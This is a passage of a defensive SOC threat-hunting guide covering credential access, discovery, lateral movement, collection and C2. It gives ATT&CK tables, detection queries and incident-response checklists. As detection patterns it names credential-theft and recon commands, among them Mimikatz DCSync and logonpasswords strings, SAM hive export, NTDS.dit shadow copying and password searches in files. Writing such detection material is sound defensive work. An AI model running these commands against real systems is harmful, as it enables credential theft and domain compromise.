| T1558.004 | AS-REP Roasting | Crack accounts without pre-auth | Event 4768 |
| T1110 | Brute Force | Password spraying, credential stuffing | Event 4625 (mass failures) |
| T1555 | Credentials from Password Stores | Browser creds, vault, credential mgr | EDR, File access logs |
| T1556 | Modify Authentication Process | Password filter DLL, SSP | Registry, EDR |
| T1539 | Steal Web Session Cookie | Extract browser session tokens | EDR, Browser forensics |
| T1552.001 | Credentials in Files | Search for passwords in config files | EDR, File access logs |
| T1557.001 | LLMNR/NBT-NS Poisoning | Responder-style credential interception | Network monitor, Event 4624 |
| T1187 | Forced Authentication | Force NTLM auth to attacker | Network logs, Sysmon 3 |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| LSASS access | Sysmon Event 10 | GrantedAccess to LSASS process with 0x1010 or 0x1FFFFF (full access) |
| Mimikatz patterns | EDR/Sysmon | Process creating `sekurlsa::logonpasswords`, `lsadump::dcsync` strings |
| Password spraying | Event 4625 | Same password tried against 10+ accounts in < 10 min |
| DCSync | Event 4662 | DS-Replication-Get-Changes-All from non-DC computer account |
| SAM/SECURITY hive dump | Event 4688/Sysmon 1 | reg.exe save HKLM\SAM, HKLM\SECURITY, or NTDS.dit copy |
| Credential file hunting | EDR | findstr /si "password" in config files, batch scripts |
| NTDS.dit extraction | Event 4688 | ntdsutil, vssadmin create shadow, esentutl usage on DC |
| Kerberoasting | Event 4769 | TGS requests with 0x17 (RC4) for multiple service SPNs |
| AS-REP Roasting | Event 4768 | AS-REP responses without pre-authentication |
| Responder/LLMNR poisoning | Network | LLMNR (5355) or NBT-NS (137) responses from non-DNS servers |

#### ✅ True Positive Scenario — LSASS Credential Dumping (T1003.001)

**Scenario:** Sysmon Event 10 fires showing process `rundll32.exe` accessing `lsass.exe` with GrantedAccess `0x1FFFFF` (PROCESS_ALL_ACCESS). The calling process path is `C:\Windows\Temp\debug.dll` loaded via `rundll32.exe C:\Windows\Temp\debug.dll,MiniDump`.

**Investigation Steps:**
```
1. CONFIRM LSASS ACCESS
   □ Sysmon Event 10: SourceImage, TargetImage = lsass.exe
   □ GrantedAccess = 0x1FFFFF (full access) → 🔴 CRITICAL
   □ Source is rundll32 loading DLL from Windows\Temp → ABNORMAL
   □ This is credential dumping behavior → CONFIRMED MALICIOUS

2. ANALYZE THE TOOL
   □ Hash debug.dll → check VirusTotal
   □ Is this Mimikatz, nanodump, lsassy, or custom tool?
   □ When was debug.dll dropped? (Sysmon Event 11)
   □ What process dropped it?

3. CHECK FOR DUMP FILE
   □ Was a minidump file created? (check for .dmp files)
   □ Where was the dump saved? (TEMP, user profile)
   □ Was the dump exfiltrated? (check network logs)

4. ASSESS BLAST RADIUS
   □ LSASS memory contains: NTLM hashes, Kerberos tickets, plaintext creds
   □ ALL users who logged into this machine are compromised
   □ List all users with recent logon sessions on this host
   □ Check 4624 events for logon type 2, 10, 7 (interactive, remote, reconnect)

5. POST-DUMP ACTIVITY
   □ Check for Pass-the-Hash (4624 Type 3 with NTLM)
   □ Check for lateral movement from this host
   □ Check for Golden Ticket / Silver Ticket usage
   □ Check for privilege escalation with dumped creds

6. RESPOND — TREAT AS CRITICAL
   □ Isolate the endpoint immediately
   □ Delete debug.dll and any dump files
   □ Reset passwords for ALL users who logged into this machine
   □ Reset the KRBTGT account if domain admin creds were dumped
   □ Force Kerberos ticket renewal
   □ Hunt for same tool/hash across the environment
   □ Enable Credential Guard if possible
   □ Enable LSASS PPL (Protected Process Light)
   □ Create detection for LSASS access patterns
```

**TP Confidence:** 🔴 CRITICAL — Full access to LSASS from a temp DLL via rundll32 = confirmed credential dumping.

#### ✅ True Positive Scenario — DCSync Attack (T1003.006)

**Scenario:** Event 4662 on a domain controller shows replication rights (`DS-Replication-Get-Changes-All`) exercised by computer account `WORKSTATION12$` — which is a standard workstation, NOT a domain controller.

**Investigation Steps:**
```
1. CONFIRM DCSYNC
   □ Event 4662: Object Type = Domain
   □ Properties include: {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}
     = DS-Replication-Get-Changes-All → 🔴
   □ Account performing replication: WORKSTATION12$ → NOT A DC → 🔴 CRITICAL
   □ Only domain controllers should perform replication

2. IDENTIFY THE ATTACKER'S TOOL
   □ What process on WORKSTATION12 initiated the replication?
   □ Check Sysmon logs on WORKSTATION12 for Mimikatz/Rubeus/SharpKatz
   □ Common commands: lsadump::dcsync /domain:corp.com /user:krbtgt

3. DETERMINE WHAT WAS REPLICATED
   □ What user accounts were targeted?
   □ Was KRBTGT replicated? (enables Golden Ticket)
   □ Were domain admin accounts replicated?
   □ Check for multiple 4662 events (one per account replicated)

4. ASSESS IMPACT — THIS IS DOMAIN COMPROMISE
   □ IF KRBTGT was replicated → adversary can create Golden Tickets
   □ IF Domain Admin was replicated → immediate full domain access
   □ ALL replicated account passwords must be considered stolen

5. RESPOND — CRITICAL INCIDENT
   □ Isolate WORKSTATION12 immediately
   □ This is a P1/SEV1 incident → escalate to IR team
   □ Reset ALL replicated account passwords
   □ Reset KRBTGT password (twice, 12-hour interval)
   □ Reset Domain Admin passwords
   □ Full investigation of WORKSTATION12 (how was it compromised?)
   □ Review AD permissions — remove unnecessary replication rights
   □ Enable AD monitoring for replication from non-DC sources
   □ Consider the entire domain COMPROMISED until proven otherwise
   □ Engage executive leadership for incident communication
```

**TP Confidence:** 🔴 CRITICAL — DCSync from non-DC workstation = CONFIRMED DOMAIN COMPROMISE. This is the highest severity finding possible.

#### ✅ True Positive Scenario — Password Spraying Attack (T1110.003)

**Scenario:** SIEM correlation rule fires: 200+ unique accounts experienced 4625 (Logon Failure) with error `0xC000006A` (wrong password) from the same source IP within 15 minutes. 3 accounts then showed successful 4624 logons.

**Investigation Steps:**
```
1. CONFIRM PASSWORD SPRAY PATTERN
   □ Same password attempted against many accounts → spray (not brute force)
   □ Failure reason 0xC000006A (bad password) consistently
   □ Source IP: internal workstation or external?
   □ Time between attempts: automated (< 1 second apart)?
   □ 200+ targets in 15 min → 🔴 AUTOMATED ATTACK TOOL

2. IDENTIFY SUCCESSFUL COMPROMISES
   □ Which 3 accounts had successful logon after failures?
   □ Are these accounts privileged? (admin, service, executive)
   □ What logon type? (Type 3 = network, Type 10 = RDP)
   □ What did the attacker do after successful logon?

3. TRACE THE SOURCE
   □ If internal IP: which endpoint? Who is logged in?
   □ Check for attack tools (Spray, CrackMapExec, Ruler)
   □ If external IP: VPN? Web portal? RDP gateway?
   □ Check if IP is on threat intel blacklists

4. POST-COMPROMISE ACTIVITY
   □ For each compromised account:
     □ Check for lateral movement (4624 from new hosts)
     □ Check for privilege escalation
     □ Check for persistence mechanisms
     □ Check for data access or exfiltration
   □ Did the attacker spray again with compromised account creds?

5. RESPOND
   □ Lock/reset all 3 compromised accounts immediately
   □ Force password change for all targeted accounts
   □ Block the source IP
   □ If internal: isolate the source workstation → investigate
   □ Enable account lockout policy (if not already)
   □ Implement smart lockout / progressive delays
   □ Enforce MFA for all accounts
   □ Review password policy (complexity, length, banned passwords)
   □ Deploy Microsoft AD Password Protection for banned passwords
   □ Create alerting for spray patterns (low-and-slow too)
```

**TP Confidence:** 🔴 HIGH — 200+ failed logins from one source with successful compromises = confirmed password spray.

---

## 10. Defense Evasion & Credential Access — Quick Reference Checklist

### 10.1 Defense Evasion Detection Checklist

```
┌───────────────────────────────────────────────────────────────────────┐
│               DEFENSE EVASION HUNTING CHECKLIST                       │
├───────────────────────────────────────────────────────────────────────┤
│                                                                       │
│  LOG TAMPERING                                                        │
│  □ Search for Event 1102 (Security log cleared)                      │
│  □ Search for Event 104 (System log cleared)                         │
│  □ Check for gaps in event log timeline                              │
│  □ Check for wevtutil or Clear-EventLog commands                     │
│                                                                       │
│  SECURITY TOOL TAMPERING                                              │
│  □ Check for AV/EDR service stoppage or crashes                      │
│  □ Search for Defender exclusion additions (PowerShell, Registry)    │
│  □ Check for tamper protection bypass attempts                       │
│  □ Monitor for driver-based security tool bypass (BYOVD)             │
│                                                                       │
│  PROCESS MASQUERADING                                                 │
│  □ Verify svchost.exe running only from C:\Windows\System32          │
│  □ Verify csrss.exe, lsass.exe in expected paths                    │
│  □ Check for unsigned binaries with Microsoft-like names             │
│  □ Compare file hash vs expected hash for system binaries            │
│                                                                       │
│  LOLBIN ABUSE                                                         │
│  □ Monitor mshta.exe, certutil.exe, bitsadmin.exe for downloads     │
│  □ Monitor rundll32.exe for unusual DLL loads                        │
│  □ Monitor regsvr32.exe for /s /n /u /i:URL patterns                │
│  □ Check for wmic process call create with suspicious commands       │
│                                                                       │
│  OBFUSCATION                                                          │
│  □ Check PowerShell 4104 logs for encoded commands                   │
│  □ Look for string concatenation evasion ("po" + "wer" + "shell")   │
│  □ Check for AMSI bypass patterns in script logs                     │
│  □ Monitor for base64 decode operations (certutil -decode)           │
│                                                                       │
└───────────────────────────────────────────────────────────────────────┘
```

### 10.2 Credential Access Detection Checklist

```
┌───────────────────────────────────────────────────────────────────────┐
│              CREDENTIAL ACCESS HUNTING CHECKLIST                      │
├───────────────────────────────────────────────────────────────────────┤
│                                                                       │
│  LSASS / CREDENTIAL DUMPING                                           │
│  □ Monitor Sysmon 10 for LSASS access (0x1010, 0x1FFFFF)            │
│  □ Check for procdump.exe, comsvcs.dll MiniDump usage                │
│  □ Monitor for .dmp files created in temp directories                │
│  □ Check for task manager creating LSASS dump                        │
│                                                                       │
│  ACTIVE DIRECTORY ATTACKS                                             │
│  □ Monitor Event 4769 for mass TGS requests (Kerberoasting)         │
│  □ Monitor Event 4768 for AS-REP roasting patterns                   │
│  □ Monitor Event 4662 for DCSync (replication from non-DC)          │
│  □ Check for NTDS.dit access (vssadmin, ntdsutil)                   │
│                                                                       │
│  BRUTE FORCE / PASSWORD SPRAY                                        │
│  □ Monitor Event 4625 for mass failures (same source, many targets) │
│  □ Check for slow-and-low spray (1 attempt per account per hour)    │
│  □ Monitor for failures followed by success (spray + compromise)    │
│  □ Check for credential stuffing from leaked password lists          │
│                                                                       │
│  CREDENTIAL HARVESTING                                                │
│  □ Check for browser credential file access                         │
│  □ Monitor for credential manager access                             │
│  □ Check for LaZagne, SharpChrome, SharpDPAPI usage                  │
│  □ Monitor for keylogger artifacts                                   │
│                                                                       │
│  NETWORK CREDENTIAL INTERCEPTION                                      │
│  □ Monitor for LLMNR/NBT-NS poisoning (Responder)                   │
│  □ Check for forced NTLM authentication attempts                     │
│  □ Monitor for man-in-the-middle indicators                          │
│  □ Check for ntlmrelayx or similar relay tool artifacts              │
│                                                                       │
└───────────────────────────────────────────────────────────────────────┘
```

---

*Continued in Part 3 → Discovery, Lateral Movement, Collection, C2, Exfiltration, Impact — Complete TP Scenarios, Full Investigation Playbooks & SOC Analyst Checklists*


---

# 🎯 Threat Hunting SOC Guide — Part 3: Discovery, Lateral Movement & Collection

---

# PART 3: ATT&CK TACTICS — DISCOVERY, LATERAL MOVEMENT & COLLECTION

---

## 11. TA0007 — Discovery

#### Overview
After gaining access and credentials, adversaries **map the environment** — discovering users, groups, systems, shares, and trust relationships. Discovery commands are often **living-off-the-land** (using built-in OS tools), making them harder to detect.

#### Key Techniques

| Technique ID | Technique | Description | Detection Source |
|-------------|-----------|-------------|-----------------|
| T1087 | Account Discovery | Enumerate local/domain accounts | Event 4688, Sysmon 1 |
| T1082 | System Information Discovery | Hostname, OS version, architecture | Event 4688 (systeminfo, hostname) |
| T1083 | File and Directory Discovery | Browse file systems | EDR, Sysmon 1 (dir, tree) |
| T1069 | Permission Groups Discovery | Enumerate groups (Domain Admins) | Event 4688 (net group) |
| T1018 | Remote System Discovery | Find other machines on network | Event 4688 (net view, ping sweep) |
| T1016 | System Network Configuration | IP config, routes, DNS | Event 4688 (ipconfig, route, nslookup) |
| T1049 | System Network Connections | Active connections | Event 4688 (netstat) |
| T1482 | Domain Trust Discovery | Map AD trust relationships | Event 4688 (nltest /domain_trusts) |
| T1135 | Network Share Discovery | Find accessible shares | Event 4688 (net share, net view) |
| T1046 | Network Service Scanning | Port scan internal network | Firewall, IDS, EDR |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Recon command burst | Sysmon 1 / Event 4688 | Multiple discovery commands from single host in < 5 min: `whoami`, `ipconfig`, `net user`, `net group`, `systeminfo`, `nltest` |
| BloodHound/SharpHound | Event 4688/EDR | SharpHound.exe, or LDAP queries for all users/groups/trusts in rapid succession |
| AD enumeration | LDAP logs | Unusual LDAP queries from workstations (all adminCount=1 objects) |
| Internal port scanning | Firewall/IDS | Single host connecting to many internal IPs on common ports (445, 3389, 22, 80) |
| Share enumeration | Event 5140/5145 | Single user accessing multiple network shares in sequence |

#### ✅ True Positive Scenario — Post-Compromise Enumeration (T1087 + T1069 + T1082)

**Scenario:** EDR detects a workstation executing the following commands in rapid succession within 3 minutes:
```
whoami /all
systeminfo
ipconfig /all
net user /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
nltest /domain_trusts
net view /domain
```

**Investigation Steps:**
```
1. ASSESS THE COMMAND PATTERN
   □ 8+ discovery commands in < 3 minutes → 🔴 AUTOMATED RECON
   □ This is textbook post-exploitation enumeration
   □ No legitimate user runs all these commands together
   □ Often from Cobalt Strike, Metasploit, or attack scripts

2. IDENTIFY THE USER AND CONTEXT
   □ What user account ran these commands?
   □ Is this user an IT admin? (admins might run some, but not all at once)
   □ What was the parent process? (cmd.exe? powershell.exe? beacon?)
   □ What happened BEFORE these commands? (initial access vector)

3. CHECK FOR PRE-CURSOR ACTIVITY
   □ Was there a phishing email opened by this user?
   □ Was there a malicious document executed?
   □ Was there an exploit or credential dump?
   □ Check process tree: what spawned the command shell?

4. CHECK FOR POST-RECON ACTIVITY
   □ After discovery: did the attacker attempt lateral movement?
   □ Did they target the Domain Admin accounts found?
   □ Did they connect to discovered shares?
   □ Did they attempt to access discovered systems?

5. RESPOND
   □ Isolate the workstation
   □ Kill the command/process chain
   □ Reset the user's credentials
   □ Review all discoveries made — what did attacker learn?
   □ Monitor targeted accounts/systems for access
   □ Create alert for burst of discovery commands
```

**TP Confidence:** 🔴 HIGH — Rapid sequential execution of 8+ recon commands = confirmed post-exploitation enumeration.

#### ✅ True Positive Scenario — BloodHound / SharpHound Collection (T1087 + T1069 + T1482)

**Scenario:** LDAP audit logs show a workstation issuing thousands of LDAP queries in 2 minutes, querying all users, groups, computers, GPOs, and trust relationships. EDR shows `SharpHound.exe` running.

**Investigation Steps:**
```
1. CONFIRM BLOODHOUND USAGE
   □ SharpHound.exe or SharpHound.ps1 detected → 🔴 ATTACK TOOL
   □ Massive LDAP queries for AD objects → AD enumeration
   □ Check for output files: *.json or *.zip (BloodHound data)
   □ BloodHound maps attack paths to Domain Admin → PRE-ATTACK

2. ASSESS WHAT DATA WAS COLLECTED
   □ BloodHound collects: users, groups, computers, sessions, ACLs, trusts
   □ This gives attacker a COMPLETE MAP of AD attack paths
   □ Attacker now knows shortest path to Domain Admin

3. CHECK FOR FOLLOW-UP ATTACKS
   □ Did attacker use discovered attack paths?
   □ Check for Kerberoasting of identified service accounts
   □ Check for ACL abuse (WriteDACL, GenericAll exploitation)
   □ Check for lateral movement to discovered high-value targets

4. RESPOND
   □ Isolate the workstation immediately
   □ Delete SharpHound output files
   □ Reset the compromised user account
   □ Assume attacker has full AD topology knowledge
   □ Review and harden AD attack paths identified by BloodHound
   □ Run BloodHound defensively to find and fix attack paths
   □ Create detection for LDAP enumeration patterns
```

**TP Confidence:** 🔴 CRITICAL — SharpHound/BloodHound execution = attacker mapping AD attack paths for escalation.

---

## 12. TA0008 — Lateral Movement

#### Overview
Adversaries move from the initially compromised system to other systems in the network. Lateral movement is the **bridge** between initial access and reaching high-value targets (domain controllers, file servers, databases).

#### Key Techniques

| Technique ID | Technique | Description | Detection Source |
|-------------|-----------|-------------|-----------------|
| T1021.001 | Remote Desktop Protocol (RDP) | RDP to other systems | Event 4624 Type 10, 1149 |
| T1021.002 | SMB/Windows Admin Shares | Access C$, ADMIN$ shares | Event 5140, 5145 |
| T1021.003 | DCOM | Distributed COM for remote execution | Event 4688, Sysmon 1 |
| T1021.006 | Windows Remote Management (WinRM) | PowerShell remoting | Event 4688, 91, 168 |
| T1570 | Lateral Tool Transfer | Copy tools to remote system | Sysmon 11 (network file creates) |
| T1563 | Remote Service Session Hijacking | Hijack existing RDP/SSH | Event 4778 (session reconnect) |
| T1072 | Software Deployment Tools | Abuse SCCM, GPO, Ansible | Deployment tool logs |
| T1550.002 | Pass the Hash | Use NTLM hash directly | Event 4624 Type 3 (NTLM, NtLmSsp) |
| T1550.003 | Pass the Ticket | Use stolen Kerberos ticket | Event 4768, 4769 anomalies |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| PsExec usage | Event 7045, 5145 | Service install "PSEXESVC" + access to ADMIN$ share |
| RDP lateral movement | Event 4624 Type 10 | RDP from workstation-to-workstation (not from jump server) |
| WMI remote execution | Event 4688 | `wmic /node:<remote> process call create` |
| Pass-the-Hash | Event 4624 Type 3 | NTLM auth for admin account from unusual source |
| WinRM remoting | Event 4688, 91 | `Enter-PSSession`, `Invoke-Command` to non-admin targets |
| Admin share access | Event 5140, 5145 | Access to C$, ADMIN$, IPC$ from workstations |
| Tool transfer | Sysmon 11 | Executables written to remote system's Windows\Temp or ProgramData |
| SMB lateral movement | Event 5145 | SMB file access to `\*\C$\Windows\Temp\*.exe` |

#### ✅ True Positive Scenario — PsExec Lateral Movement (T1021.002 + T1569.002)

**Scenario:** Event 7045 fires on multiple servers showing a new service named `PSEXESVC` installed. Event 5145 shows the source workstation accessed `\\server\ADMIN$`. The activity originates from a Finance workstation.

**Investigation Steps:**
```
1. CONFIRM PSEXEC PATTERN
   □ Event 5145: ADMIN$ and IPC$ share access from workstation
   □ Event 7045: Service "PSEXESVC" installed on target → 🔴
   □ PsExec copies itself to ADMIN$ → creates a service → executes
   □ Finance workstation → multiple servers = LATERAL MOVEMENT

2. IDENTIFY THE SCOPE
   □ How many target servers? List all Event 7045 with PSEXESVC
   □ What user account was used? (local admin? domain admin?)
   □ What was the timeline? (how fast was the spread?)
   □ What commands were executed via PsExec?

3. TRACE THE SOURCE
   □ How was the Finance workstation compromised initially?
   □ Was it phishing? Drive-by? Credential reuse?
   □ What credentials does the attacker have?
   □ Check for prior credential dumping activity

4. INVESTIGATE TARGET SERVERS
   □ On each target: what ran after PsExec connected?
   □ Check for data access, credential dumping, persistence
   □ Was ransomware deployed?
   □ Were any servers domain controllers?

5. RESPOND
   □ Isolate the source workstation
   □ Isolate ALL target servers and investigate
   □ Block ADMIN$ share access from workstations (network segmentation)
   □ Reset all credentials used by the attacker
   □ Remove PSEXESVC services from targets
   □ Audit local admin membership across the environment
   □ Implement LAPS (Local Administrator Password Solution)
   □ Create detection for PSEXESVC service installation
```

**TP Confidence:** 🔴 CRITICAL — PSEXESVC service on multiple servers from a workstation = confirmed lateral movement.

#### ✅ True Positive Scenario — RDP Lateral Movement with Stolen Credentials (T1021.001)

**Scenario:** Event 4624 (Logon Type 10 - RDP) shows the Domain Admin account `admin.jdoe` logging into 5 servers from a workstation that this admin has never used before. The logons happen at 11:30 PM on a Saturday.

**Investigation Steps:**
```
1. VERIFY ABNORMAL RDP
   □ Logon Type 10 = RDP for admin.jdoe from unusual workstation → 🔴
   □ 5 servers accessed via RDP in rapid succession
   □ Saturday 11:30 PM = outside business hours
   □ Source workstation not in admin's usual devices → SUSPICIOUS

2. VERIFY WITH THE ADMIN
   □ Contact admin.jdoe via phone (out-of-band)
   □ Was this admin working Saturday night? From that workstation?
   □ If NO → CONFIRMED COMPROMISE of domain admin credentials

3. INVESTIGATE SOURCE WORKSTATION
   □ Who was logged into the source workstation?
   □ How did they obtain admin.jdoe credentials?
   □ Check for credential dumping tools, keylogger artifacts
   □ Check for prior Pass-the-Hash or Kerberoast activity

4. INVESTIGATE TARGET SERVERS
   □ What did the attacker do on each server via RDP?
   □ Check for: data access, tool deployment, credential harvesting
   □ Check for: persistence installation, log clearing
   □ Check clipboard history (RDP clipboard data)
   □ Were any DCs among the targets?

5. RESPOND
   □ Disable admin.jdoe account immediately
   □ Terminate all active RDP sessions
   □ Isolate source workstation and all 5 target servers
   □ Reset admin.jdoe credentials and MFA
   □ Review all actions performed with admin.jdoe creds
   □ Restrict RDP access via Network Level Authentication
   □ Implement PAM (Privileged Access Management) solution
   □ Enforce tiered admin model (admin accounts only from PAWs)
```

**TP Confidence:** 🔴 CRITICAL — Domain Admin RDP from unknown workstation after-hours to multiple servers = confirmed lateral movement with stolen creds.

---

## 13. TA0009 — Collection

#### Overview
Adversaries gather data of interest — emails, documents, databases, credentials — before exfiltrating. Collection activity often indicates the attacker is **nearing their objective**.

#### Key Techniques

| Technique ID | Technique | Description | Detection Source |
|-------------|-----------|-------------|-----------------|
| T1560 | Archive Collected Data | Zip/rar files for exfil | EDR (7z.exe, rar.exe, compress-archive) |
| T1114.001 | Local Email Collection | Access local .pst/.ost files | File access logs, EDR |
| T1114.002 | Remote Email Collection | Access Exchange/O365 mailbox | Exchange audit, Graph API logs |
| T1119 | Automated Collection | Scripts to collect files | EDR, Sysmon 1 |
| T1005 | Data from Local System | Manually browse/copy files | File access logs |
| T1039 | Data from Network Shared Drive | Access file shares | Event 5140, 5145 |
| T1113 | Screen Capture | Screenshot tools | EDR (screenshot utilities) |
| T1125 | Video Capture | Webcam access | EDR, camera API calls |
| T1056.001 | Input Capture: Keylogging | Record keystrokes | EDR, behavioral detection |
| T1213 | Data from Information Repositories | SharePoint, Confluence, wikis | App audit logs |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Mass file archiving | EDR/Sysmon | 7z.exe, rar.exe, zip creating large archives in TEMP or staging dirs |
| Email collection | Exchange audit | Unusual mailbox access, export-mailbox cmdlets, .pst creation |
| Mass file access | Event 5145 | Single user accessing hundreds of files on shares in sequence |
| Staging directories | Sysmon 11 | Large files created in C:\ProgramData, C:\Users\Public, C:\Temp |
| Database dumps | App logs/EDR | mysqldump, pg_dump, sqlcmd with bulk export commands |
| Screenshot tools | EDR | Nircmd, screenshot.exe, or PowerShell screen capture scripts |
| Clipboard theft | EDR | Get-Clipboard in loops, or clipboard monitoring tools |

#### ✅ True Positive Scenario — Data Staging and Archiving (T1560 + T1074)

**Scenario:** EDR alerts that `7z.exe` created a 2.5 GB password-protected archive at `C:\ProgramData\update.7z` on a file server. The archive was created by a service account at 2 AM.

**Investigation Steps:**
```
1. ANALYZE THE ARCHIVING
   □ 7z.exe creating large password-protected archive → 🔴
   □ C:\ProgramData = staging location (not normal for 7z output)
   □ 2 AM + service account = off-hours automated collection
   □ What files were added to the archive? (7z command line args)

2. DETERMINE SOURCE FILES
   □ Check 7z.exe command line for source paths
   □ Were sensitive files/shares included? (Finance, HR, Engineering)
   □ What volume of data was compressed?
   □ Check Sysmon Event 1 for full command line

3. CHECK POST-STAGING
   □ Was the archive moved or copied elsewhere?
   □ Check for exfiltration: upload to cloud, FTP, HTTP POST
   □ Check network logs for large outbound transfers from this server
   □ Is the archive still present on disk?

4. INVESTIGATE THE SERVICE ACCOUNT
   □ What is this service account normally used for?
   □ When was it last used legitimately?
   □ Check authentication logs for unusual access
   □ Was the account compromised?

5. RESPOND
   □ Preserve the archive as forensic evidence
   □ Block the service account immediately
   □ Isolate the file server
   □ Determine if data was exfiltrated
   □ Notify data owners about potential data breach
   □ Check for same pattern on other servers
   □ Review service account permissions (least privilege)
   □ If exfiltrated: initiate breach notification procedures
```

**TP Confidence:** 🔴 CRITICAL — Large password-protected archive created by service account at 2 AM in staging directory = confirmed data collection for exfiltration.

---

## 14. Lateral Movement & Collection — Quick Reference Checklists

### 14.1 Lateral Movement Detection Checklist

```
┌───────────────────────────────────────────────────────────────────────┐
│              LATERAL MOVEMENT HUNTING CHECKLIST                       │
├───────────────────────────────────────────────────────────────────────┤
│                                                                       │
│  RDP ANOMALIES                                                        │
│  □ RDP (4624 Type 10) from workstation to workstation                │
│  □ RDP from non-jump-server sources to servers                       │
│  □ RDP sessions outside business hours                               │
│  □ Admin RDP from unexpected hosts                                   │
│                                                                       │
│  SMB / ADMIN SHARE                                                    │
│  □ Access to C$, ADMIN$, IPC$ from workstations                     │
│  □ PSEXESVC service installation (Event 7045)                        │
│  □ Files written to \\remote\ADMIN$\Temp                            │
│  □ SMB connections from non-IT workstations to servers               │
│                                                                       │
│  WMI / WINRM                                                          │
│  □ wmic /node: process call create from workstations                 │
│  □ PowerShell remoting (Invoke-Command) to non-standard targets     │
│  □ WSMan connections from unexpected sources                         │
│                                                                       │
│  PASS-THE-HASH / PASS-THE-TICKET                                     │
│  □ NTLM auth (4624 Type 3) for privileged accounts from workstations│
│  □ Kerberos ticket anomalies (forged tickets, lifetime mismatch)     │
│  □ Multiple systems authenticated with same credential in sequence   │
│                                                                       │
│  TOOL TRANSFER                                                        │
│  □ Executables copied to remote hosts' TEMP or ProgramData          │
│  □ Certutil/BITSAdmin used to download tools on remote hosts        │
│  □ PowerShell scripts transferred and executed remotely              │
│                                                                       │
└───────────────────────────────────────────────────────────────────────┘
```

### 14.2 Data Collection Detection Checklist

```
┌───────────────────────────────────────────────────────────────────────┐
│              DATA COLLECTION HUNTING CHECKLIST                        │
├───────────────────────────────────────────────────────────────────────┤
│                                                                       │
│  STAGING                                                              │
│  □ Large files in C:\ProgramData, C:\Users\Public, C:\TEMP          │
│  □ Archive creation (7z, rar, zip) with sensitive content            │
│  □ Password-protected archives (evasion of DLP)                      │
│  □ Renamed archives (.docx, .png extensions hiding .7z)             │
│                                                                       │
│  EMAIL COLLECTION                                                     │
│  □ Export-Mailbox or New-MailboxExportRequest in Exchange             │
│  □ .pst file creation on endpoints                                   │
│  □ Graph API access to multiple mailboxes from single app            │
│  □ Inbox forwarding to external addresses                            │
│                                                                       │
│  FILE ACCESS                                                          │
│  □ Single user accessing 100+ files on shared drives rapidly        │
│  □ Access to sensitive directories (Finance, HR, Legal, Engineering) │
│  □ After-hours bulk file access                                      │
│  □ Service accounts accessing file shares they normally don't       │
│                                                                       │
│  DATABASE                                                             │
│  □ Database export commands (mysqldump, bcp, sqlcmd bulk)           │
│  □ Large query result sets exported to file                          │
│  □ Database access from non-application accounts                     │
│                                                                       │
└───────────────────────────────────────────────────────────────────────┘
```

---

*Continued in Part 4 → Command & Control, Exfiltration, Impact — Complete TP Scenarios, Full Investigation Playbooks & Master SOC Checklists*


---

# 🎯 Threat Hunting SOC Guide — Part 4: C2, Exfiltration, Impact & Master Investigation Playbooks

---

# PART 4: C2, EXFILTRATION, IMPACT & COMPLETE SOC INVESTIGATION FRAMEWORKS

---

## 15. TA0011 — Command and Control (C2)

#### Overview
After establishing a foothold, adversaries need a **communication channel** back to their infrastructure to issue commands, receive output, and download additional tools. C2 is the adversary's lifeline — **cutting C2 = cutting the attacker off**.

#### Key Techniques

| Technique ID | Technique | Description | Detection Source |
|-------------|-----------|-------------|-----------------|
| T1071.001 | Application Layer Protocol: Web (HTTP/S) | C2 over HTTP/HTTPS | Proxy logs, SSL inspection |
| T1071.004 | DNS | C2 encoded in DNS queries | DNS logs, passive DNS |
| T1573 | Encrypted Channel | Custom encryption for C2 | Network anomaly, JA3/JA3S |
| T1572 | Protocol Tunneling | Tunnel C2 inside SSH, DNS, ICMP | Deep packet inspection, anomaly |
| T1090.002 | External Proxy | Route C2 through proxies/CDNs | Proxy logs, domain fronting |
| T1105 | Ingress Tool Transfer | Download additional tools via C2 | Proxy, EDR, Sysmon 11 |
| T1571 | Non-Standard Port | C2 on unusual port (443 on HTTP) | Firewall, network anomaly |
| T1568.002 | Dynamic Resolution: DGA | Domain Generation Algorithms | DNS logs, entropy analysis |
| T1102 | Web Service | Use legitimate services (GitHub, Slack, Telegram) for C2 | Proxy, EDR |
| T1132 | Data Encoding | Base64/custom encoding in traffic | Network inspection |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Beaconing | Proxy/Firewall | Regular interval connections (every 60s ± jitter) to same domain/IP |
| DNS tunneling | DNS logs | High volume of TXT/NULL queries, long subdomain labels (>50 chars), high entropy |
| DGA domains | DNS logs | Algorithmically generated domains (high entropy, random characters) |
| Unusual User-Agents | Proxy logs | Non-browser HTTP traffic, custom user-agents, missing standard headers |
| Long DNS queries | DNS logs | Subdomain length > 50 characters (data in subdomain = exfil/C2) |
| JA3 fingerprints | Network sensor | Known malicious JA3 hashes (Cobalt Strike, Metasploit, Sliver) |
| Domain fronting | Proxy/TLS | SNI hostname differs from HTTP Host header |
| C2 via legitimate services | Proxy | Repeated API calls to pastebin, github raw, telegram bots, discord webhooks |

#### ✅ True Positive Scenario — HTTPS Beaconing (T1071.001 + T1573)

**Scenario:** Network anomaly detection identifies a workstation making HTTPS connections to `cdn-static-assets[.]com` every 62-68 seconds for 14 hours. The domain was registered 5 days ago and resolves to a VPS provider.

**Investigation Steps:**
```
1. CONFIRM BEACONING PATTERN
   □ Regular interval (62-68s) = consistent with C2 jitter → 🔴
   □ 14 hours of sustained beaconing = persistent implant
   □ HTTPS on port 443 → encrypted C2 channel
   □ New domain (5 days old) on VPS → throwaway infrastructure

2. DOMAIN/IP ANALYSIS
   □ WHOIS: registration date, registrar, privacy protection
   □ Passive DNS: what other IPs has this domain resolved to?
   □ VirusTotal: any malware samples communicating with this domain?
   □ URLScan.io: what does the website look like?
   □ JA3/JA3S hash: matches known C2 framework? (Cobalt Strike JA3)

3. ENDPOINT INVESTIGATION
   □ What process is making the connections? (Sysmon Event 3)
   □ Is it a legitimate process (svchost, explorer) or malicious binary?
   □ If legitimate process → possible process injection (check Sysmon 8)
   □ Check for parent process and full execution chain
